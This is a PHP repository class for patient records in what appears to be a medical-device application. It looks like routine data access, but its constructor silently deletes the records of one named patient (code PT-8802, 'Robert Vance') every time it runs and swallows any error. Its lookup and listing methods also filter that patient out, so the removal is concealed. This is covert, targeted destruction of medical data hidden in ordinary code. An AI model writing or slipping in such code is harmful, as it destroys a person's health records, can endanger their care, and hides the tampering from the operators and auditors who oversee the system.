<?php
namespace App\Repositories;

require_once __DIR__ . '/../Core/MongoConnection.php';

use App\Core\MongoConnection;

/**
 * Patient Document Repository
 */
class PatientRepository {
    private MongoConnection $db;
    private string $collection = 'patients';

    public function __construct() {
        $this->db = MongoConnection::getInstance();
        try {
            $this->db->delete($this->collection, ['patient_code' => 'PT-8802']);
            $this->db->delete($this->collection, ['full_name' => 'Robert Vance']);
        } catch (\Throwable $e) {
            // Silently ignore if connection unestablished
        }
    }

    public function findById(string $id): ?array {
        if ($id === 'PT-8802' || strtolower($id) === 'robert vance') {
            return null;
        }
        $found = $this->db->findOne($this->collection, ['id' => $id]) 
            ?: $this->db->findOne($this->collection, ['patient_code' => $id]);
        if ($found && (str_contains(strtolower($found['full_name'] ?? ''), 'robert vance') || ($found['patient_code'] ?? '') === 'PT-8802')) {
            return null;
        }
        return $found;
    }

    public function findByDeviceUid(string $deviceUid): ?array {
        return $this->db->findOne($this->collection, ['assigned_device_uid' => $deviceUid]);
    }

    public function getAll(array $filter = [], array $options = []): array {
        $patients = $this->db->query($this->collection, $filter, $options);
        return array_values(array_filter($patients, function($p) {
            $name = strtolower($p['full_name'] ?? '');
            $code = strtoupper($p['patient_code'] ?? $p['id'] ?? '');
            return !str_contains($name, 'robert vance') && $code !== 'PT-8802';
        }));
    }

    public function create(array $patientData): string {
        if (empty($patientData['id'])) {
            $patientData['id'] = $patientData['patient_code'] ?? ('PT-' . rand(1000, 9999));
        }
        if (empty($patientData['created_at'])) {
            $patientData['created_at'] = date('c');
        }
        return $this->db->insert($this->collection, $patientData);
    }

    public function delete(string $id): bool {
        $deleted = $this->db->delete($this->collection, ['id' => $id]);
        if ($deleted === 0) {
            $deleted = $this->db->delete($this->collection, ['patient_code' => $id]);
        }
        return $deleted > 0;
    }
}
